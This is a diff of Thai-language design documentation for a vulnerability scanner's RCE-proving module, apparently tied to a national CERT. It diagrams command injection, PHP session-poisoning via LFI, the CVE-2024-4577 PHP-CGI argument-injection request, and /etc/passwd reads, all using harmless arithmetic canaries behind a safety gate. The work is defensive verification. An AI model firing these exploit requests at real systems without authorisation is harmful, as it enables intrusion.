@@ -194,56 +194,96 @@ $$\text{Canary Sum} = \text{seed}_a + \text{seed}_b \quad (\text{เช่น } 
 <?php echo 'THAICERT_CANARY_EVAL_'.(54321+19876); exit; ?>
 ```
 
-### 5.3 รายละเอียด 3 ลำดับขั้นการเจาะลึกและตรวจสอบ RCE (3-Vector Proving Engine)
+### 5.3 ผังลำดับเหตุการณ์และตรรกะเงื่อนไข (Sequence Diagram with Condition Logic)
 
-ระบบ [`audit/rce_prover.py`](file:///Users/admin/Desktop/OPScaner/audit/rce_prover.py) ออกแบบให้ทดสอบผ่าน 3 ลำดับขั้นหลักตามลักษณะของเป้าหมาย:
+กระบวนการประเมิน RCE ผ่าน [`audit/rce_prover.py`](file:///Users/admin/Desktop/OPScaner/audit/rce_prover.py) แสดงความสัมพันธ์ระหว่าง Operator, OPScaner Engine, Target Web Server, Disk Inodes และ Runtime Engine พร้อมเงื่อนไขการตัดสินผล (Condition Logic: `alt` / `opt` / `loop`):
 
 ```mermaid
-flowchart TD
-    Start(["เริ่มการตรวจพิสูจน์ RCE<br/>probe_active_rce_proof()"]) --> Gate{"ตรวจสอบ Safety Gate<br/>(allow_active_rce == True?)"}
-    
-    Gate -- "False (ค่าเริ่มต้น)" --> GateBlock["🛡️ ระงับการเจาะระบบชั่วคราว<br/>PROBING_DISABLED_BY_SAFETY_GATE<br/>(แสดงข้อความเตือนให้ระบุ --active-rce)"]
-    
-    Gate -- "True (ได้รับอนุญาต)" --> Recon["1. Dynamic Crawler & FPD Recon<br/>- ค้นหา Form/Endpoint (*.php, *.cgi)<br/>- Regex ตรวจจับ Drive C:, D: และ XAMPP/IIS<br/>- ดึงรายการ Parameter (page, file, cmd ฯลฯ)"]
-    
-    Recon --> Flow1{"Flow 1: Direct OS Command<br/>ตรวจพบพารามิเตอร์ cmd/exec/shell?"}
-    
-    Flow1 -- "พบพารามิเตอร์" --> TestCmd["ส่ง GET ?cmd=echo+THAICERT_CMD_{seed}<br/>ทดสอบการประมวลผลบน cmd.exe/bash"]
-    TestCmd --> CheckCmd{"ผลลัพธ์มีข้อความ<br/>THAICERT_CMD_{sum}?"}
-    CheckCmd -- "ใช่ (สำเร็จ)" --> RCE_Cmd["🔥 RCE_CONFIRMED<br/>Direct OS Command Injection (CWE-78)"]
-    CheckCmd -- "ไม่ใช่" --> Flow2
-    
-    Flow1 -- "ไม่พบ" --> Flow2{"Flow 2: PHP Session Poisoning<br/>เป้าหมายรัน PHP (is_php == True)?"}
-    
-    Flow2 -- "ใช่" --> PrepCanary["สร้าง Dynamic Arithmetic Canary<br/>seed_a (10000-89999) + seed_b (1000-9999)<br/>payload: &lt;?php echo 'THAICERT_CANARY_EVAL_'.(seed_a+seed_b); exit; ?&gt;"]
-    PrepCanary --> PoisonSess["ส่ง Multipart POST พร้อม Header:<br/>PHP_SESSION_UPLOAD_PROGRESS = canary_payload<br/>เพื่อสร้างไฟล์ sess_{PHPSESSID}"]
-    PoisonSess --> InodeScan["วนลูปสแกน Inode ทั่วทั้งระบบไฟล์:<br/>- Windows: C:/Windows/Temp/, C:/xampp/tmp/, D:/temp/<br/>- Linux: /tmp/, /var/lib/php/sessions/<br/>ผ่าน LFI: /?page={session_path}"]
-    InodeScan --> TriState{"Tri-State Evaluation<br/>ผลลัพธ์ที่ตอบกลับมาตรงกับเงื่อนไขใด?"}
-    
-    TriState -- "พบ THAICERT_CANARY_EVAL_{ผลบวกเลข}" --> RCE_Sess["🔥 RCE_CONFIRMED<br/>LFI to Session Upload Progress RCE<br/>(ยืนยันว่า PHP รันคำสั่งบวกเลขจริง)"]
-    TriState -- "พบข้อความดิบ &lt;?php หรือสตริงที่ยังไม่ Eval" --> Canary_LFI["⚠️ CANARY_CONFIRMED<br/>ยืนยัน LFI สำเร็จ (อ่านไฟล์เซสชันได้)<br/>แต่ PHP Engine ไม่ได้ประมวลผลโค้ด"]
-    TriState -- "ไม่พบ หรือตรงกับ 404 Baseline" --> Flow3
-    
-    Flow2 -- "ไม่ใช่" --> Flow3{"Flow 3: PHP-CGI Argument Injection<br/>(CVE-2024-4577 บน Windows)?"}
-    
-    Flow3 -- "is_php && is_windows" --> TestCGI["ส่ง POST /index.php?%ADd+allow_url_include=1...<br/>พร้อมบอดี้: &lt;?php echo 'THAICERT_CGI_RCE_'.(seed_c+seed_d); exit; ?&gt;"]
-    TestCGI --> CheckCGI{"ผลลัพธ์มีข้อความ<br/>THAICERT_CGI_RCE_{sum}?"}
-    CheckCGI -- "ใช่ (สำเร็จ)" --> RCE_CGI["🔥 RCE_CONFIRMED<br/>PHP-CGI Argument Injection (CVE-2024-4577)"]
-    CheckCGI -- "ไม่ใช่" --> Flow4
-    
-    Flow3 -- "ไม่ใช่" --> Flow4["Flow 4: Fallback LFI Read<br/>ทดสอบอ่าน /etc/passwd หรือ win.ini"]
-    Flow4 --> CheckLFI{"อ่านไฟล์ระบบสำเร็จ?"}
-    CheckLFI -- "ใช่" --> Confirmed_LFI["⚠️ CONFIRMED_LFI<br/>Arbitrary File Read (CWE-22 / CWE-98)"]
-    CheckLFI -- "ไม่ใช่" --> NotConfirmed["❌ NOT_CONFIRMED<br/>ไม่พบช่องโหว่การรันคำสั่งหรือการอ่านไฟล์"]
-    
-    RCE_Cmd --> SignSHA256["ออกลายมือชื่อดิจิทัล (Digital Signature)<br/>สร้าง SHA-256 Digest จาก Request/Response<br/>เพื่อใช้เป็นพยานหลักฐานทางนิติวิทยาศาสตร์"]
-    RCE_Sess --> SignSHA256
-    RCE_CGI --> SignSHA256
-    Canary_LFI --> SignSHA256
-    Confirmed_LFI --> SignSHA256
-    NotConfirmed --> End(["จบการประเมิน"])
-    GateBlock --> End
-    SignSHA256 --> End
+sequenceDiagram
+    autonumber
+    actor User as ผู้ตรวจสอบ (Operator)
+    participant Engine as OPScaner (rce_prover.py)
+    participant TargetWeb as Target Web Server (HTTP)
+    participant Inode as Target Disk (Session Inodes)
+    participant Exec as Runtime Engine (PHP/cmd.exe)
+
+    Note over User,Engine: [เงื่อนไข 0] ตรวจสอบมาตรการความปลอดภัย Safety Gate
+    User->>Engine: เริ่มต้นการสแกนระบบ
+    alt allow_active_rce == False (โหมด Passive มาตรฐาน)
+        Engine-->>User: 🛡️ ระงับทันที: PROBING_DISABLED_BY_SAFETY_GATE (ไม่ส่ง Exploit ใดๆ)
+    else allow_active_rce == True (ได้รับสิทธิ์อนุญาต)
+        Engine->>TargetWeb: GET / (Crawler & Recon ค้นหา Form, Endpoint, Drive C:/D:)
+        TargetWeb-->>Engine: HTML Response (พบพารามิเตอร์: page, file, cmd ฯลฯ)
+
+        opt เงื่อนไข 1: ตรวจพบพารามิเตอร์ส่งคำสั่งระบบ (cmd, exec, shell, ping)
+            Note over Engine,Exec: Flow 1: Direct OS Command Injection Check
+            Engine->>TargetWeb: GET /diagnostic.php?cmd=echo+THAICERT_CMD_74197
+            TargetWeb->>Exec: ส่งคำสั่งเข้า cmd.exe หรือ bash
+            Exec-->>TargetWeb: ส่งข้อความออกทาง Stdout: "THAICERT_CMD_74197"
+            TargetWeb-->>Engine: HTTP 200 (Body: "THAICERT_CMD_74197")
+            alt Response Body มีสตริง "THAICERT_CMD_74197"
+                Engine->>Engine: ออกลายเซ็นดิจิทัล SHA-256 Digest
+                Engine-->>User: 🔥 RCE_CONFIRMED: ยืนยัน OS Command Injection (CWE-78)
+            end
+        end
+
+        opt เงื่อนไข 2: เป้าหมายรัน PHP (is_php == True)
+            Note over Engine,Exec: Flow 2: PHP2Shell - Session Poisoning with Dynamic Canary
+            Engine->>Engine: สุ่มเลข Dynamic Canary: 54321 + 19876 = 74197
+            Engine->>Engine: ประกอบ Payload: <?php echo 'THAICERT_CANARY_EVAL_'.(54321+19876); exit; ?>
+            
+            Engine->>TargetWeb: POST /login.php (Multipart Form-Data)<br/>Header: PHP_SESSION_UPLOAD_PROGRESS = Canary Payload<br/>Cookie: PHPSESSID=opscaner881234
+            TargetWeb->>Inode: บันทึกไฟล์เซสชันลงดิสก์: sess_opscaner881234
+            TargetWeb-->>Engine: HTTP 200 (Session Inode Created)
+
+            loop วนลูป LFI Parameter (page, file, include) x Inode Paths (Windows C:, D: / Linux /tmp)
+                Engine->>TargetWeb: GET /?page=C:/xampp/tmp/sess_opscaner881234
+                TargetWeb->>Inode: ตรวจสอบและดึงไฟล์เซสชัน
+                alt เคส A: เซิร์ฟเวอร์ใช้ include() / require() ในการโหลดไฟล์
+                    Inode->>Exec: ส่งสตรีมโค้ดเข้า PHP Parser
+                    Exec->>Exec: คำนวณคณิตศาสตร์: 54321 + 19876 = 74197
+                    Exec-->>TargetWeb: คืนค่าผลบวก: "THAICERT_CANARY_EVAL_74197"
+                    TargetWeb-->>Engine: HTTP 200 (Body: "THAICERT_CANARY_EVAL_74197")
+                    Engine->>Engine: ออกลายเซ็นดิจิทัล SHA-256 Digest
+                    Engine-->>User: 🔥 RCE_CONFIRMED: รันคำนวณคณิตศาสตร์สำเร็จ 100% (CWE-94/98)!
+                else เคส B: เซิร์ฟเวอร์ใช้เพียง readfile() หรือ file_get_contents()
+                    Inode-->>TargetWeb: ข้อความดิบในไฟล์โดยไม่มีการรัน
+                    TargetWeb-->>Engine: HTTP 200 (Body: "<?php echo 'THAICERT_CANARY_EVAL_'...")
+                    Engine->>Engine: ออกลายเซ็นดิจิทัล SHA-256 Digest
+                    Engine-->>User: ⚠️ CANARY_CONFIRMED: อ่านไฟล์ได้ (LFI สำเร็จ) แต่เซิร์ฟเวอร์ไม่รันโค้ด
+                else เคส C: ไม่พบไฟล์ หรือติด WAF / สิทธิ์การเข้าถึง
+                    TargetWeb-->>Engine: HTTP 404 / 403 (หรือตรงกับ 404 Baseline)
+                    Note over Engine: วนลูปต่อไปยัง Inode Path ถัดไป
+                end
+            end
+        end
+
+        opt เงื่อนไข 3: สถาปัตยกรรมเป็น Windows + PHP (is_windows && is_php)
+            Note over Engine,Exec: Flow 3: PHP-CGI Windows Argument Injection (CVE-2024-4577)
+            Engine->>TargetWeb: POST /index.php?%ADd+allow_url_include=1+%ADd+auto_prepend_file=php://input<br/>Body: <?php echo 'THAICERT_CGI_RCE_'.(seed_c+seed_d); exit; ?>
+            TargetWeb->>Exec: PHP-CGI ประมวลผลแทรกคำสั่งจาก php://input
+            Exec-->>TargetWeb: คืนค่าผลบวก: "THAICERT_CGI_RCE_58921"
+            TargetWeb-->>Engine: HTTP 200 (Body: "THAICERT_CGI_RCE_58921")
+            alt Response Body มีสตริงผลบวก CGI RCE
+                Engine->>Engine: ออกลายเซ็นดิจิทัล SHA-256 Digest
+                Engine-->>User: 🔥 RCE_CONFIRMED: ยืนยัน CVE-2024-4577 บน Windows สำเร็จ!
+            end
+        end
+
+        opt เงื่อนไข 4: Fallback LFI Read อ่านไฟล์ระบบมาตรฐาน
+            Note over Engine,Inode: Flow 4: Fallback LFI Read (/etc/passwd หรือ win.ini)
+            Engine->>TargetWeb: GET /?page=/etc/passwd (หรือ win.ini)
+            TargetWeb->>Inode: อ่านไฟล์ระบบ
+            Inode-->>TargetWeb: เนื้อหาในไฟล์ (root:x:0:0: หรือ [fonts])
+            TargetWeb-->>Engine: HTTP 200 (Body: "root:x:0:0:...")
+            alt ตรวจพบ Signature ไฟล์ระบบ
+                Engine-->>User: ⚠️ CONFIRMED_LFI: ยืนยันการอ่านไฟล์ระบบสำเร็จ (CWE-22)
+            else ไม่พบลายเซ็นใดๆ
+                Engine-->>User: 🛡️ NOT_CONFIRMED: ไม่พบช่องโหว่ RCE หรือ LFI
+            end
+        end
+
+    end
 ```
 
 ### 5.4 การฉีดข้อมูลและค้นหา Inode ของไฟล์เซสชัน (Dynamic Inode Traversal Matrix)
